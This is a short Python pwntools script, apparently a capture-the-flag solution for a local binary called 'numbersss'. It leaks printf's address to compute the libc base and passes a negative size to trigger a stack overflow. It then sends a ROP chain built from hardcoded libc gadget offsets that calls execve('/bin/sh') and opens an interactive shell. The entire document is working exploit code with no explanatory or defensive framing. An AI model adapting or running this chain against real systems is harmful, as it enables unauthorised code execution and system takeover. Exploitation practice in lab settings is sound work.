from pwn import *

# exploit with real docker + libc later, same exploit concept

libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
b *0x401207
b *vuln + 200
'''

#p = gdb.debug("./numbersss", gdbscript = script)
p = process("./numbersss")

p_recvut(b"junk: ")
libc_base = int(p.recvline(), 16) - libc.symbols['printf']
print(hex(libc_base))

# becareful, choose the size precisely because we may overwrite some important variable on stack
p_sla(b"in?\n", b"-128")

pop_rdi = libc_base + 0x000000000002a3e5
ret = pop_rdi + 1
pop_rsi = libc_base + 0x000000000002be51
pop_rdx_r12 = libc_base + 0x000000000011f2e7
pop_rax = libc_base + 0x0000000000045eb0
syscall = libc_base + 0x0000000000029db4
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]

payload = b"A" * 0x10
payload += p64(0) + p64(pop_rdi)
payload += p64(binsh) + p64(pop_rsi)
payload += p64(0) + p64(pop_rdx_r12)
payload += p64(0) * 2
payload += p64(pop_rax) + p64(59)
payload += p64(syscall)
payload = payload.ljust(0x80, b"B")
p_s(payload)

print(len(payload))

p.interactive()